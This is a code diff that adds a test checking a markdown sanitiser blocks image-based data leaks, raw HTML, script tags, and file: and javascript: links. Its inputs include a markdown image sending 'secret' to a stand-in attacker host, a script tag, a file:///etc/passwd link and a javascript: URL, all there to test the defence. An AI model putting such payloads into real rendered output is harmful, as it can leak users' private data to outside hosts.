@@ -299,3 +299,20 @@ def test_fake_status_views(tmp_path):
         payload = json.loads(proc.stdout)
         seen[g] = run_js(f"console.log(JSON.stringify(statusKey(gatewayView({json.dumps(payload)}), {{phase:'idle'}})));")
     assert seen == {"connected": "connected", "disconnected": "disconnected", "disabled": "disabled", "unsandboxed": "degraded-isolation", "incompatible": "degraded"}
+
+
+def test_markdown_images_and_raw_html_are_neutralised_and_links_restricted():
+    out = run_js(r"""
+      console.log(JSON.stringify({
+        img: safeMarkdown('hi ![x](https://evil.example/?d=secret) there'),
+        ref: safeMarkdown('![pic][1]'),
+        html: safeMarkdown('a <img src="http://e/x.png"> b <script>x</script>'),
+        keep: safeMarkdown('**bold** [docs](https://example.org)'),
+        links: [isSafeLink('https://example.org/x'), isSafeLink('http://a.b'), isSafeLink('file:///etc/passwd'), isSafeLink('javascript:alert(1)'), isSafeLink('/rel'), isSafeLink('')]
+      }));
+    """)
+    assert "evil.example" not in out["img"] and "image omitted: x" in out["img"]
+    assert "image omitted" in out["ref"]
+    assert "<img" not in out["html"] and "<script" not in out["html"]
+    assert out["keep"] == "**bold** [docs](https://example.org)"
+    assert out["links"] == [True, True, False, False, False, False]
